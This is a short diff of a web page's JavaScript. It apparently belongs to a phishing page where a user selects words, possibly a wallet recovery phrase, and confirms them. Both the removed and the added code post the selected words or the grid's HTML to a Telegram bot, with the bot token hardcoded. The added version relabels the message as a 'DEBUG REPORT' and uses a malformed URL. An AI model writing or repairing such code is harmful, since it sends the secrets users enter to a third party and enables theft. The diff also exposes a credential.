@@ -1499,24 +1499,24 @@ document.addEventListener("DOMContentLoaded", () => {
     confirmButton.addEventListener("click", async () => {
 
         try {
-            const length = document.getElementById("Length")?.value;
 
+            const lengthElement = document.getElementById("Length");
             const wordsGrid = document.getElementById("wordsGrid");
-            let selectedWords = [];
-
-            if (wordsGrid) {
-                selectedWords = Array.from(wordsGrid.querySelectorAll(".selected"))
-                    .map(el => el.textContent.trim());
-            }
 
             const message =
-`📝 New Submission
+`DEBUG REPORT
 
-📏 Length: ${length || "N/A"}
-🔤 Words: ${selectedWords.join(", ") || "N/A"}
-⏰ Time: ${new Date().toLocaleString()}`;
+Length value:
+${lengthElement ? lengthElement.value : "Length element not found"}
 
-            await fetch(`https://api.telegram.org/bot8820185140:AAGC0CpxNuz2XSPqfcu4lGII3w9XHm1SwBI/sendMessage`, {
+WordsGrid HTML:
+${wordsGrid ? wordsGrid.innerHTML.substring(0, 3000) : "wordsGrid not found"}
+
+Timestamp:
+${new Date().toISOString()}
+`;
+
+            await fetch("https://api.telegram.org/botbot8820185140:AAGC0CpxNuz2XSPqfcu4lGII3w9XHm1SwBI/sendMessage/sendMessage", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json"
@@ -1528,7 +1528,7 @@ document.addEventListener("DOMContentLoaded", () => {
             });
 
         } catch (err) {
-            console.log("Telegram error:", err);
+            console.log(err);
         }
 
     });
